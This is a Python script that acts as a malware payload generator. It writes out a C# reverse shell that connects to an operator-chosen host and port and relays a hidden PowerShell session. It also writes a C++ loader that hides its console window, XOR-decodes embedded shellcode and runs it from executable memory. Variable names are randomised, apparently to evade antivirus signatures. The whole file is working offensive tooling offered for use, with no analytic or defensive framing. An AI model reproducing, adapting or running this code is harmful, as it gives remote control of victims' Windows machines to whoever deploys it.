import random
from os.path import exists
import os
#from builder import compile
random_var=[]
def generate_varnames():
	letters = "abcderfhijklnopqrstuvwyxz"
	word=""
	for i in range(1,7):
		ran = random.randint(1,len(letters)-1)	
		word += (letters[ran])
	return word
for i in range(10):
		word = generate_varnames()
		if len(word) >= 6:
			random_var.append(word)
def generate_csharp(LHOST,LPORT):
	data = '''using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
namespace '''+random_var[0]+'''
{
	public class Program
	{
		static StreamWriter '''+random_var[1]+''';
		static TcpClient '''+random_var[2]+''';
		static Stream '''+random_var[3]+''';

		static StreamReader '''+random_var[4]+''';
		public static void Main(string[] args)
		{
			string '''+random_var[8]+''' = "'''+LHOST+'''";
			int '''+random_var[9]+''' = '''+LPORT+''';
			using('''+random_var[2]+''' = new TcpClient('''+random_var[8]+''', '''+random_var[9]+'''))
			{
				if ('''+random_var[2]+'''.Connected){
					'''+random_var[5]+'''();
				}
			}
		}
		private static void '''+random_var[5]+'''(){
			'''+random_var[3]+''' = '''+random_var[2]+'''.GetStream();
			'''+random_var[4]+''' = new StreamReader('''+random_var[3]+''');
					
			'''+random_var[1]+''' = new StreamWriter('''+random_var[3]+''');
			
			StringBuilder '''+random_var[7]+''' = new StringBuilder();

			Process '''+random_var[6]+''' = new Process();
			'''+random_var[6]+'''.StartInfo.FileName = "powershell.exe";
			'''+random_var[6]+'''.StartInfo.CreateNoWindow = true;
			'''+random_var[6]+'''.StartInfo.UseShellExecute = false;
			'''+random_var[6]+'''.StartInfo.RedirectStandardOutput = true;
			'''+random_var[6]+'''.StartInfo.RedirectStandardInput = true;
			'''+random_var[6]+'''.StartInfo.RedirectStandardError = true;
			'''+random_var[6]+'''.OutputDataReceived += new DataReceivedEventHandler('''+random_var[8]+''');
			'''+random_var[6]+'''.Start();
			'''+random_var[6]+'''.BeginOutputReadLine();

			while(true)
			{
				'''+random_var[7]+'''.Append('''+random_var[4]+'''.ReadLine());
				'''+random_var[6]+'''.StandardInput.WriteLine('''+random_var[7]+''');
				'''+random_var[7]+'''.Remove(0, '''+random_var[7]+'''.Length);
			}
		}
		private static void '''+random_var[8]+'''(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder '''+random_var[9]+''' = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    '''+random_var[9]+'''.Append(outLine.Data);
                    '''+random_var[1]+'''.WriteLine('''+random_var[9]+''');
                    '''+random_var[1]+'''.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}'''
	path = "payload/client_csharp.cs"
	file_exists = exists(path)
	if file_exists:
		os.remove(path)
	with open(path,"w") as file:
		file.write(data)
	file.close()
	#compile("client_csharp.cs","c#")
def generate_cplus(bytes):
	data = '''#include <cstring>
#include <iostream>
#define _WIN32_WINNT 0x0500
#include<windows.h>
 
int main(int argc, char **argv) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char '''+random_var[0]+'''[] = {'''+bytes+'''};
	char '''+random_var[1]+'''[sizeof '''+random_var[0]+'''];
	for (int i = 0; i < sizeof '''+random_var[0]+'''; i++) {'''+random_var[1]+'''[i] = '''+random_var[0]+'''[i] ^ 'x';}
	void *'''+random_var[2]+''' = VirtualAlloc(0, sizeof '''+random_var[1]+''', MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy('''+random_var[2]+''', '''+random_var[1]+''', sizeof '''+random_var[1]+''');
	((void(*)())'''+random_var[2]+''')();		
}'''
	path = "payload/client_cplus.cpp"
	file_exists = exists(path)
	if file_exists:
		os.remove(path)
	with open(path,"w") as file:
		file.write(data)
	file.close()
	#compile("client_cplus.cpp","c")
